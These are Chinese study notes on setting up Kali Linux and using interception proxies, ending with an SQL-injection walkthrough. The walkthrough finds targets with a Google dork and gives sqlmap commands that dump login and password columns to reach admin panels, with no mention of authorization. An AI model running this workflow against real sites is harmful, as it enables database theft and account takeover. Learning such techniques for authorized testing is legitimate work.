# kali

## Setup kali

[Kali官网](http:/kali.org)

虚拟机 （Debian 64，20G）

### 添加 Kali 更新源

``` shell
# vim /etc/apt/sources.list

deb http://http.kali.org/kali kali main non-free contrib
deb-src http://http.kali.org/kali kali main non-free contrib
deb http://security.kali.org/kali-security kali/updates main contrib non-free
deb http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib
deb-src http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib
deb http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib
deb-src http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib
deb http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib
deb-src http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib
deb http://mirrors.163.com/debian wheezy main non-free contrib
deb-src http://mirrors.163.com/debian wheezy main non-free contrib
deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib
deb http://mirrors.163.com/debian-security wheezy/updates main non-free contrib

# apt-get update 更新源
# apt-get upgrade 下载要更新的软件包

kali-linux安装中文输入法（以下任意选择一种安装）：

# apt-get install fcitx-table-wbpy ttf-wqy-microhei ttf-wqy-zenhei                        # 拼音五笔
# apt-get install ibus ibus-pinyin              # 经典的ibus
# apt-get install fcitx fcitx-pinyin fcitx-module-cloudpinyin fcitx-googlepinyin                # fcitx拼音

注销，重新登录之后才可以使用。

```

### 启动 postgresql 服务

``` shell
# service postgresql start
# service metasploit start

在终端启动 metasploit 框架

# msfconsole

msf >
```

## 代理简介

### 正向代理 (Forward Proxy)

> 代理终端终端用户的访问请求

内部网络 -> proxy(代理主机) -> 外部网络

- 访问本无法访问的服务器（翻墙）
- Cache 作用
- 客户端访问授权
- 隐藏访问者的行踪

### 反向代理（Reverse Proxy）

> 代理 Web 等服务的服务器

Web服务 <--------- 反向代理服务器  -----> 网管 <---------> 内网

### 透明代理

### Kali 代理工具

### Mitmproxy

- a man-in-the-middle proxy (中间人攻击)
- Intercept HTTP requests and responses and modify them on the fly. (req/res 修改数据)
- Save complete HTTP conversations for later replay and analysis.
- Replay the client-side of an HTTP conversations.
- Replay proxy mode to forward traffic to a specified server.
- Transparent proxy mode on OSX and Linux.
- Make scripted changes to HTTP traffic using Python.
- **SSL** certificates for interception are generated on the fly.
- And much, much more.

``` shell

# mitmproxy -p 8080  #监听端口（）

1. 在浏览器配置代理IP和端口
2. 访问页面并查看终端输出的信息

pageDown/pageUp 翻页查看信息

过滤js信息：输入 `l` 之后出现 `Limit: `, 之后输入 `Limit: /.js`

清楚信息：输入 `l` 清楚 `/.js`

查看某一个请求信息：选中请求地址之后回车，会出现连个选项卡（Request | Response）, tab 键切换， 输入 q 回到主界面

拦截请求：输入 `i` 会出现 `Intercept filter:`, `~u \.php`，访问页面是有php文件请求时拦截，输入`a`放行，如果要编辑，则选择请求地址并按下` ENTER` 键并按下 `e` 键会出现 `Edit request (query, form, url, header, raw body, method)?` 按下 `q` 退出，继续输入 `a` 放行
```


命令行

`?` 进入帮助信息界面

`q` 返回到请求列表界面

`C` 清空列表

`j` 向下移动箭头

`k` 向上移动箭头

`PgUp/PgDown or 空格键` 上下翻页

### Owasp-zap

> OWASP Zed Attack Proxy Project 攻击代理(简称 ZAP)，是一款查找网页应用程序漏洞的综合类渗透测试工具。它包含了拦截代理、自动处理、被动处理、暴力破解、端口扫描以及蜘蛛搜索等功能。

为会话类调试工具，调试功能对网站不会发起大量请求，对服务器影响较小。

应用实例

``` shell
启动服务
# owasp-zap

选项->本地代理(Local Proxies)-> port: 8800

浏览器配置代理
```

### Paros

> paros proxy, 这是一个对 web 应用程序的漏洞进行评估的代理程序，即一个基于 Java 的 web 代理程序，可以评估 Web 应用程序的漏洞。它支持动态地编辑/查看 HTTP/HTTPS， 从而改变 cookies 和表单字段等项目。它包括一个 Web 通信记录程序，Web 圈套程序(spider)，hash 计算器，还有一个可以测试常见的 Web 应用程序攻击(如 SQL 注入式攻击和跨站脚本攻击)的扫描器。该工具检查漏洞形式包括：SQL 注入、跨站点脚本攻击、目录遍历等。

``` SHELL
# paros
tools->Local proxy -> 设置PI和port
浏览器设置代理IP地址访问
```

### Surp  Suite

> Burp Suite 是用于攻击 Web 应用程序的集成平台
> 代理 Burp Suite 带有一个代理，通过默认端口8080上运行，使用这个代理，可以截获并修改从客户端到 Web 应用程序的数据包

- Proxystrike
  - plugin engine(Create your own plugins)
  - Request interceptor
  - Request diffing
  - Request repeater
  - Automatic crawl process
  - http request/resonse
  - history request
  - parameter stats request
  - parameter values stats
  - Request url parameter signing and header field singing
  - Use of an alternate proxy(tor for example ;D)
  - Sql attackes(plugin)
  - Server Side includes(plugin)
  - Xss attacks(plugin)
  - Attack logs
  - Exort results to HTML or XML

`# proxystrike`

### webscarab

> 代理软件，包括 HTTP代理，网络爬行、网络蜘蛛、会话 ID 分析，自动脚本接口，模糊测试工具，Web格式的编码/解码，Web 服务描述语言和SOAP解析器等功能模块。WebScarab 基于 GNu 协议，使用 Java编写，是WebGoat 中所使用的 工具之一。

intercept 拦截

### 注入案例

```
以 sql 注入入手，目标为熟悉基本的思路

1. 通过google hack 寻找测试目标
2. asp 站点的 sql 注入
3. php 站点的 sql 注入及管理后台的寻找过程


公司 inurl:asp?id=

1. 测试数字型注入点
2. sqlmap 拆解数据库和表名
3. dump 表数据
4. 登录后台


查看所有数据库，当前用户
# sqlmap -u domain.com/index.aps?id=12 --dbs --current-user

# sqlmap -u domain.com/index.aps?id=12 -T table_name --columns 显示所有列名

# sqlmap -u domain.com/index.aps?id=12 -T table_name -C login_name,pass,username --dump 显示字段内容

后台登录入口

```

PHP 站点的SQL注入

``` shell
1. 测试数字型注入点: 
2. sqlmap 拆解数据库和表名
3. dump 表数据
4. 利用 nikto 帮助寻找隐藏目录
5. 利用网页源代码中的隐藏信息寻找管理后台

常规测试：domain.com/index.php?id=1'

```